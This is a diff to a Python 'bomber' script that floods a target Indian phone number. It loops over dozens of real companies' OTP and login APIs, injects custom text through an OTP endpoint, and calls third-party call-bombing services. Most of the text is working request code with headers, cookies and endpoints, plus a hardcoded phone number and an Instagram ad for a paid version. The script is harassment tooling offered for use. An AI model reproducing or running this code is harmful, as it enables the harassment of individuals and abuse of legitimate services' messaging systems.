-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
-                    'x-requested-with': 'XMLHttpRequest',
+                    # 'Cookie': 'ib_referral=https://www.google.com/; ib_utm_date_time=Invalid Date; ib_activity_time=9-1-2022 10:59:39',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-origin',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
                 }
 
                 data8 = {
                     'username': number,
                 }
+
                 response8 = requests.post('https://www.industrybuying.com/user/api/send-otp/', cookies=cookies8, headers=headers8, data=data8)
 
 
@@ -454,26 +858,33 @@ class Mainscript:
 
 
             def nira():
+            
+
                 headers4 = {
-                    'authority': '63ti5s0o80.execute-api.ap-south-1.amazonaws.com',
-                    'accept': 'application/json, text/plain, */*',
-                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'en-US,en;q=0.5',
                     # Already added when you pass json=
-                    # 'content-type': 'application/json',
-                    'dnt': '1',
-                    'origin': 'https://apply.nirafinance.com',
-                    'referer': 'https://apply.nirafinance.com/',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'cross-site',
-                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
+                    # 'Content-Type': 'application/json',
+                    'Origin': 'https://apply.nirafinance.com',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    'Referer': 'https://apply.nirafinance.com/',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'cross-site',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
                 }
 
                 json_data4 = {
                     'mobileNumber': number,
                     'otp': '',
                 }
+
                 response4 = requests.post('https://63ti5s0o80.execute-api.ap-south-1.amazonaws.com/Prod/nirawebloginapi', headers=headers4, json=json_data4)
+                
+                
 
 
 
@@ -577,183 +988,107 @@ class Mainscript:
 
 
             try:
-                while True:
+                while 1:
+                    mycircle()
                     flipkart()
+                    #trell()
+                    #dunzo()
                     jeet()
                     apollo()
+                    aakashin()
                     medbuzz()
+                    jio()
+                    hosing()
                     gomechanic()
-                    #macdonal()
+                    kotakbank()
+               #     bookmylauda()
                     nira()
-                    #fastpronumber()
-                    #industrialapi()
-                    #fastpronumber()
-                    #rummyapi()
-                    #nira()
-                    #rummytime()
-                    #rummyapi()
-                    #snapmint()
+                    currybhai()
+                    macdonal()
+                    moglix()
+            
+                    fastpronumber()
+                    industrialapi()
+                    rummyapi()
+                    rummytime()
+                    snapmint()
             except:
                 _under_()
                 chutmarike('Bombing stopped..')
                 _under_()
                 sys.exit()
-                
-                
-                
+
 
         elif self.data_main==2:
             _cls_front_under()
-            chutmarike('For call , custom msg and fastest api buy the premium script ..')
+            chutmarike('11 words only supported !')
             _under_()
-            chutmarike('To buy script contact me on instagram : @sincryptzork')
-            sys.exit()
-            number2 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
-            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number2+r)
-            
-            def callphp():
-                #
-                cookies13 = {
-                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
-                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
-                }
-
-                headers13 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'DNT': '1',
-                    'Connection': 'keep-alive',
-                    # Requests sorts cookies= alphabetically
-                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
-                    'Upgrade-Insecure-Requests': '1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Cache-Control': 'max-age=0',
-                    # Requests doesn't support trailers
-                    # 'TE': 'trailers',
-                }
-
-                params13 = {
-                    'sr': number2,
-                    'key': '@itztktricks',
-                    'submit': 'Submit Query',
-                }
-
-
-                response13 = requests.get('https://freebomber.ml/tk/call/call.php', params=params13, cookies=cookies13, headers=headers13)
-            try:
-                while True:
-                    callphp()
-                    callphp()
-            except:
-                _under_()
-                chutmarike('Call Bombing Stopped ..')
-                _under_()
+            custommsg = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 digit number +91 : "+r).strip()
+            newmsg = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the msg  : "+r)
+            if len(newmsg)>11:
+                chutmarike('please put only 11 words it is the maximum limit !')
                 sys.exit()
+            else:
+                pass
+            
+            if len(custommsg)<11:
+                pass
+            else:
+                chutmarike('Enter 10 digit number , indian number supported only')
+                sys.exit()
+            headers = {
+                'authority': 'api.bighaat.com',
+                'accept': '*/*',
+                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
+                'access-control-allow-origin': '*',
+                # Already added when you pass json=
+                # 'content-type': 'application/json',
+                'dnt': '1',
+                'origin': 'https://www.bighaat.com',
+                'referer': 'https://www.bighaat.com/',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
+            }
+
+            json_data = {
+                'mobileNumber': custommsg,
+                'hashcode':f'\
+\
+Team Sincryption\
+\
+msg= {newmsg}'
+            }
+
+            
+            response = requests.post('https://api.bighaat.com/identity/api/otp/send-otp', headers=headers, json=json_data)
+            _under_()
+            chutmarike(f'Sms Send Successfully to Number '+Fore.GREEN+'+91'+Fore.GREEN+f'{custommsg}')
+            _under_()
+            sys.exit()
+                
+                
         elif self.data_main==3:
             _cls_front_under()
-            number98 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
-            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number98+r)
-            
-            def mixbimb():
-                cookies122 = {
-                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
-                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
-                }
+            custommsgcall = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 digit number +91 : "+r).strip()
+            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+custommsgcall+r)
+            custommsgcall = requests.get(f'https://callbomb9899.herokuapp.com/freecall/{custommsgcall}')
+            _under_()
 
-                headers122 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Referer': 'https://freebomber.ml/tk/mix/',
-                    'DNT': '1',
-                    'Connection': 'keep-alive',
-                    # Requests sorts cookies= alphabetically
-                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
-                    'Upgrade-Insecure-Requests': '1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-User': '?1',
-                    'Cache-Control': 'max-age=0',
-                    # Requests doesn't support trailers
-                    # 'TE': 'trailers',
-                }
 
-                params122 = {
-                    'sr': '9528027588',
-                    'key': '@itztktricks',
-                    'submit': 'Submit Query',
-                }
-                response = requests.get('https://freebomber.ml/tk/mix/hard-bomber.php', params=params122, cookies=cookies122, headers=headers122)
-            try:
-                while True:
-                    mixbimb()
-            except:
-                _under_()
-                chutmarike('Sms2 stopped ..')
-                _under_()
-                sys.exit()
         elif self.data_main==4:
-            chutmarike('Coming soon ..')
-        elif self.data_main==5:
-            _cls_front_under()
-            chutmarike('For call , custom msg and fastest api buy the premium script ..')
-            _under_()
-            chutmarike('To buy script contact me on instagram : @sincryptzork')
-            sys.exit()
-            number9 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
-            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number9+r)
-            
-            def whatsappbomb():
-                cookies45 = {
-                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
-                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
-                }
-
-                headers45 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Referer': 'https://freebomber.ml/tk/whatsapp/',
-                    'DNT': '1',
-                    'Connection': 'keep-alive',
-                    # Requests sorts cookies= alphabetically
-                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
-                    'Upgrade-Insecure-Requests': '1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-User': '?1',
-                    'Cache-Control': 'max-age=0',
-                    # Requests doesn't support trailers
-                    # 'TE': 'trailers',
-                }
-
-                params45 = {
-                    'sr': number9,
-                    'key': '@itztktricks',
-                    'submit': 'Submit Query',
-                }
-
-                response45 = requests.get('https://freebomber.ml/tk/whatsapp/whatsapp-bomber.php', params=params45, cookies=cookies45, headers=headers45)
-            try:
-                while True:
-                    whatsappbomb()
-            except:
-                _under_()
-                chutmarike('Whatsapp Bombing Stopped ..')
-                _under_()
-                sys.exit()
-        elif self.data_main==6:
             os.system('python update.py' if os.name=='nt' else 'python3 update.py')
-        elif self.data_main==7:
-            _under_()
-            chutmarike('Exiting ..')
-            _under_()
             sys.exit()
+            #
+
+            
+             
+        elif self.data_main==5:
+            chutmarike('Exiting ...')
+            sys.exit()
+            
+        
 
     
 try:
